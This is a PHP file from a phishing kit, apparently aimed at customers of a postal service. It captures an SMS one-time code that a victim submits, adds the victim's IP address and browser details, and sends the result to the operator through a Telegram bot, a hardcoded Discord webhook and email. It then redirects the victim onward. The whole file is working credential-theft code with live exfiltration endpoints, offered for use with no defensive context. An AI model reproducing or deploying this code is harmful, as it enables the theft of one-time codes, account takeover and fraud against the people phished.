<?php
/*
8888888b.              888 .d8888b.                 888888888 888888888  
888  "Y88b             888d88P  Y88b                888       888        
888    888             888Y88b.                     888       888        
888    888 .d88b.  .d88888 "Y888b.   .d88b.  .d8888b8888888b. 8888888b.  
888    888d8P  Y8bd88" 888    "Y88b.d8P  Y8bd88P"        "Y88b     "Y88b 
888    88888888888888  888      "88888888888888            888       888 
888  .d88PY8b.    Y88b 888Y88b  d88PY8b.    Y88b.   Y88b  d88PY88b  d88P 
8888888P"  "Y8888  "Y88888 "Y8888P"  "Y8888  "Y8888P "Y8888P"  "Y8888P"  
Coded By DedSec55
DM:@DedSec55
*/

include ("Panel.php");

extract($_REQUEST);
$ip = getenv("REMOTE_ADDR");
$SMS = $_POST["insms"];
$agent= $_SERVER['HTTP_USER_AGENT'];

$subject = "DedSec55 DIE Post RZLT(SMS OTP 2) | Login from: $ip";
$data = "[=======🔥 DedSec55 DIE Post RZLT(SMS OTP 2) 🔥=======]
|SMS OTP  : $SMS
	--------🔑 I N F O | I P 🔑 --------
IP		      : $ip
IP lookup	  : https://ip-api.com/$ip
OS		      : $agent
[==========🏛️🍁 $ip 🍁🏛️===========]
";

$txt = $data;


if ($telegram == "on"){
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

if ($discord == "on"){
    $website_discord = "https://discord.com/api/webhooks/853952499035406346/gP12eJx5L5EqG9jFYXAkChPayfX0BFAOM5hXDnqOQZ_gnq272o4I1BsT3yB0U6hLzhPF"; 
    $json_data = array ('content'=>"$txt");
    $make_json = json_encode($json_data);
    $ch = curl_init( $website_discord );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}
if ($email == "on"){
$subject = "🏛️ DIE Post OTP SMS 2 By DedSec55🏛️  From $ip";
$headers = "From: 🍁DedSec55🍁 <takethisbruh@DedSec55.com>\r\n";
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers = 'Content-type: text/plain; charset=iso-8859-1' . "\r\n";
@mail($Bullet, $subject, $data, $headers); 
}

header("location: ../grattis.php?&sessionid={$randString}&ue={$randString}");
